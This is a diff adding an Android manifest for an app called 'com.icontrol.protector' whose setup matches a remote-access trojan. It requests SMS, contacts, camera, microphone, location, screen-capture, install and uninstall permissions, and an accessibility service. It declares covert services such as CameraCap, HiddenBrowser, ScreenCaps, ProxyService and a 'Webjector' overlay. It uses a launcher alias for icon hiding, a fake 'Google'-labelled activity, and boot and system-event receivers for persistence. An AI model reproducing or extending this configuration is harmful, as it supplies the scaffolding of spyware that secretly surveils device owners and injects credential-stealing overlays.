@@ -1,0 +1,484 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    package="com.icontrol.protector">
+
+    <uses-feature android:name="android.hardware.bluetooth" android:required="false"/>
+    <uses-feature android:name="android.hardware.location" android:required="false"/>
+    <uses-feature android:name="android.hardware.location.network" android:required="false"/>
+    <uses-feature android:name="android.hardware.location.gps" android:required="false"/>
+    <uses-feature android:name="android.hardware.camera" android:required="false"/>
+    <uses-feature android:name="android.hardware.nfc" android:required="false"/>
+    <uses-feature android:name="android.hardware.wifi" android:required="false"/>
+    <uses-feature android:name="android.hardware.telephony" android:required="false"/>
+
+
+
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+
+<!--    <uses-permission android:name="android.permission.WRITE_SETTINGS"-->
+<!--        tools:ignore="ProtectedPermissions" />-->
+<!--    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"-->
+<!--        tools:ignore="ProtectedPermissions" />-->
+
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
+        tools:ignore="ProtectedPermissions" />
+
+
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.REORDER_TASKS" />
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM"
+        tools:ignore="ExactAlarm" />
+
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"  />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
+
+
+
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="com.android.alarm.permission.SET_ALARM" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+
+
+
+
+    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />
+
+
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
+
+
+    <uses-permission android:name="android.permission.SET_WALLPAPER" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+<!--    <uses-permission android:name="android.permission.READ_CALL_LOG" />-->
+    <uses-permission android:name="android.permission.WRITE_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+
+
+    <uses-permission android:name="android.permission.CAMERA" />
+
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+
+
+   <queries>
+       <intent>
+           <action android:name="*"/>
+           <data android:mimeType="*/*"/>
+       </intent>
+   </queries>
+
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
+        tools:ignore="QueryAllPackagesPermission" />
+
+
+
+
+    <application
+        android:allowBackup="true"
+        android:usesCleartextTraffic="true"
+        android:networkSecurityConfig="@xml/network_security_config"
+        android:requestLegacyExternalStorage="true"
+        android:label="@string/BaseName"
+        android:icon="@drawable/mylogo"
+        android:supportsRtl="true"
+        android:largeHeap="true"
+        android:exported="false"
+        android:preserveLegacyExternalStorage="true"
+        android:theme="@android:style/Theme.NoTitleBar">
+        <uses-library android:name="org.apache.http.legacy" android:required="false"/>
+
+
+
+        <!--        Activitys -->
+        <provider
+            android:name="androidx.core.content.FileProvider"
+            android:authorities="${applicationId}.provider"
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/pfs1" />
+        </provider>
+
+        <activity android:name=".Splasher" android:exported="true" />
+        <activity-alias  android:name=".A2"
+            android:exported="true"
+            android:enabled="false"
+            android:label="@string/name1"
+            android:icon="@drawable/notify"
+            android:roundIcon="@drawable/notify"
+            android:screenOrientation="sensor"
+            android:hardwareAccelerated="false"
+            android:targetActivity=".Splasher"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar">
+
+            <intent-filter android:priority="1">
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.INFO" />
+                <category android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.MULTIWINDOW_LAUNCHER"/>
+            </intent-filter>
+
+        </activity-alias>
+
+        <activity-alias  android:name=".A1"
+            android:exported="true"
+            android:enabled="true"
+            android:label="@string/BaseName"
+            android:icon="@drawable/mylogo"
+            android:hardwareAccelerated="false"
+            android:targetActivity=".Splasher"
+            android:theme="@android:style/Theme.Black.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+
+        </activity-alias>
+
+
+
+<!--        <activity  android:name=".HiddenActivity"-->
+<!--            android:exported="true"-->
+<!--            android:enabled="true"-->
+<!--            android:label="@string/name1"-->
+<!--            android:icon="@drawable/notify"-->
+<!--            android:screenOrientation="sensor"-->
+<!--            android:hardwareAccelerated="false"-->
+<!--            android:targetActivity=".HiddenActivity"-->
+<!--            android:theme="@android:style/Theme.Translucent.NoTitleBar">-->
+
+<!--            <intent-filter android:autoVerify="true">-->
+<!--                <action android:name="android.intent.action.MAIN" />-->
+<!--                <category android:name="android.intent.category.LAUNCHER" />-->
+
+<!--                <action android:name="android.intent.action.VIEW" />-->
+<!--                <category android:name="android.intent.category.DEFAULT" />-->
+<!--                <category android:name="android.intent.category.BROWSABLE" />-->
+
+<!--                <data-->
+<!--                    android:scheme="https"-->
+<!--                    android:host="www.anything.org"-->
+<!--                    android:pathPrefix="/app" />-->
+
+<!--            </intent-filter>-->
+
+<!--            <meta-data-->
+<!--                android:name="android.app.lib_name"-->
+<!--                android:value="" />-->
+
+<!--        </activity>-->
+
+        <activity  android:name=".ActivMain"
+            android:exported="true"
+            android:enabled="true"
+            android:launchMode="singleTop"
+            android:screenOrientation="sensor"
+            android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|uiMode|screenSize|smallestScreenSize"
+            android:hardwareAccelerated="true"
+            android:theme="@android:style/Theme.Black.NoTitleBar">
+
+        </activity>
+
+
+
+        <activity  android:name=".LockActivity"
+            android:exported="true"
+            android:enabled="true"
+            android:label=" "
+            android:icon="@android:color/transparent"
+            android:noHistory="true"
+            android:launchMode="singleTask"
+            android:hardwareAccelerated="false"
+            android:excludeFromRecents="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar">
+
+        </activity>
+
+
+        <activity  android:name=".AlertActivity"
+            android:exported="true"
+            android:label="Alerts"
+            android:noHistory="true"
+            android:excludeFromRecents="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar">
+        </activity>
+
+        <activity
+            android:exported="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:name="com.icontrol.protector.PermissionsActivity" />
+
+        <activity
+            android:exported="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:name="com.icontrol.protector.ActivityDraw">
+
+        </activity>
+
+        <activity
+            android:exported="true"
+            android:noHistory="true"
+            android:hardwareAccelerated="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:excludeFromRecents="true"
+            android:name="com.icontrol.protector.AccessibilityActivity" />
+
+
+        <activity
+            android:exported="true"
+            android:noHistory="true"
+            android:excludeFromRecents="true"
+            android:name="com.icontrol.protector.RestrectionActivity" />
+
+
+
+        <activity android:exported="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:showOnLockScreen="true"
+            android:showWhenLocked="true"
+            android:turnScreenOn="true"
+            android:name=".ActivityCaptureScreen">
+        </activity>
+
+        <activity
+            android:exported="true"
+            android:noHistory="true"
+            android:excludeFromRecents="true"
+            android:name=".RequestDataUsage" />
+
+
+
+        <activity
+            android:name=".Requestinstall"
+            android:exported="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+        <activity
+            android:name=".RequestPermissions2"
+            android:exported="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <activity
+            android:name=".UninstallActivity"
+            android:exported="true"
+            android:excludeFromRecents="true"
+            android:noHistory="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+        <activity
+            android:name=".BrodcastActivity"
+            android:exported="true"
+            android:excludeFromRecents="true"
+            android:noHistory="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+        <activity
+            android:name=".ChatActivity"
+            android:exported="true"
+            android:windowSoftInputMode="adjustResize"
+            android:excludeFromRecents="true"
+            android:noHistory="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            />
+
+        <activity android:name=".WebBrowser"
+            android:label="View"
+            android:exported="true"
+            android:launchMode = "singleInstance"
+            android:excludeFromRecents="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            >
+
+        </activity>
+
+        <activity android:name=".Webjector"
+            android:label="View"
+            android:exported="true"
+            android:launchMode = "singleInstance"
+            android:excludeFromRecents="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            >
+
+        </activity>
+
+        <!--        Services -->
+        <service android:enabled="true"
+            android:exported="true"
+            android:name="com.icontrol.protector.WorkServices"
+            android:foregroundServiceType="dataSync"  />
+
+        <service android:enabled="true" android:exported="true" android:name="com.icontrol.protector.CameraCap" android:foregroundServiceType="dataSync"/>
+        <service android:enabled="true" android:exported="true" android:name="com.icontrol.protector.HiddenBrowser" android:foregroundServiceType="dataSync"/>
+
+
+<!--        <service android:enabled="true" android:exported="true" android:name="com.icontrol.protector.LiveChat" android:foregroundServiceType="dataSync"/>-->
+
+        <service android:enabled="true" android:exported="true" android:name="com.icontrol.protector.EngineWorker" android:foregroundServiceType="dataSync"  />
+        <service android:enabled="true" android:exported="true" android:name="com.icontrol.protector.ProxyService" android:foregroundServiceType="dataSync"  />
+        <service android:enabled="true" android:exported="true" android:name="com.icontrol.protector.StarterServices" />
+        <service android:exported="true" android:foregroundServiceType="dataSync" android:name="com.icontrol.protector.LocationMonitor" />
+
+        <service
+            android:name="com.icontrol.protector.MyJobService"
+            android:enabled="true"
+            android:exported="false"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
+
+        <service
+            android:name="com.icontrol.protector.ScreenCaps"
+            android:enabled="true"
+            android:exported="true"
+            android:foregroundServiceType="mediaProjection" />
+
+
+        <service
+            android:name=".AccessServices"
+            android:enabled="true"
+            android:exported="false"
+            android:label="@string/BaseName"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibilityprivatesrcapp" />
+
+        </service>
+
+
+<!--        <service-->
+<!--            android:name="androidx.work.impl.foreground.SystemForegroundService"-->
+<!--            android:foregroundServiceType="dataSync"-->
+<!--            android:exported="false"-->
+<!--            tools:node="merge" />-->
+
+
+
+<!--        Receivers-->
+        <receiver
+            android:name=".alarme"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="MY_CUSTOM_ACTION" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
+                <action android:name="android.intent.action.REBOOT"/>
+
+            </intent-filter>
+        </receiver>
+
+        <receiver android:name=".ResetServices"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.AIRPLANE_MODE" />
+                <action android:name="android.intent.action.BATTERY_LOW" />
+                <action android:name="android.intent.action.BATTERY_OKAY" />
+                <action android:name="android.intent.action.LOCALE_CHANGED" />
+                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
+<!--                <action android:name="android.intent.action.TIME_TICK" />-->
+                <action android:name="android.intent.action.DEVICE_STORAGE_LOW" />
+                <action android:name="android.intent.action.DEVICE_STORAGE_OK" />
+
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
+
+            </intent-filter>
+        </receiver>
+
+        <activity android:name=".TransparentActivity"
+            android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen"
+            android:enabled="true"
+            android:showWhenLocked="true"
+            android:turnScreenOn="true"
+            android:keepScreenOn="true"
+            android:showOnLockScreen="true"
+            android:launchMode="singleInstance"
+            android:documentLaunchMode="intoExisting"
+            android:configChanges="orientation|keyboardHidden|keyboard|screenSize|smallestScreenSize"
+            android:excludeFromRecents="false"
+            android:exported="true">
+
+        </activity>
+        <activity android:name=".tofront"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:enabled="true"
+            android:showWhenLocked="true"
+            android:turnScreenOn="true"
+            android:showOnLockScreen="true"
+            android:launchMode="singleInstance"
+            android:documentLaunchMode="intoExisting"
+            android:excludeFromRecents="false"
+            android:exported="true">
+
+        </activity>
+
+
+        <activity
+            android:name=".Startme"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="com.javadata.scanner.STARTER" />
+            </intent-filter>
+        </activity>
+
+
+        <activity
+            android:name=".wakeitaiv"
+            android:excludeFromRecents="true"
+            android:showForAllUsers="true"
+            android:turnScreenOn="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:label="Google" />
+
+
+<!--        <meta-data android:name="com.google.android.gms.version" android:value="12451000"/>-->
+<!--        <meta-data android:name="com.google.android.ALLOW_PHISHING_DETECTION" android:value="false"/>-->
+<!--        <meta-data android:name="com.sec.android.support.multiwindow" android:value="true"/>-->
+<!--        <meta-data android:name="com.sec.android.multiwindow.DEFAULT_SIZE_W" android:value="632.0dip"/>-->
+<!--        <meta-data android:name="com.sec.android.multiwindow.DEFAULT_SIZE_H" android:value="598.0dip"/>-->
+<!--        <meta-data android:name="com.sec.android.multiwindow.MINIMUM_SIZE_W" android:value="632.0dip"/>-->
+<!--        <meta-data android:name="com.sec.android.multiwindow.MINIMUM_SIZE_H" android:value="598.0dip"/>-->
+<!--        <meta-data android:name="com.android.dynamic.apk.fused.modules" android:value="base"/>-->
+<!--        <meta-data android:name="com.android.vending.splits" android:resource="@xml/splits0"/>-->
+<!--        <meta-data android:name="com.android.stamp.type" android:value="STAMP_TYPE_DISTRIBUTION_APK"/>-->
+<!--        <meta-data android:name="com.android.stamp.source" android:value="https://play.google.com/store"/>-->
+<!--        <meta-data android:name="com.google.android.play.billingclient.version" android:value="3.0.3"/>-->
+<!--        <meta-data android:name="com.android.vending.derived.apk.id" android:value="1"/>-->
+
+    </application>
+
+</manifest>
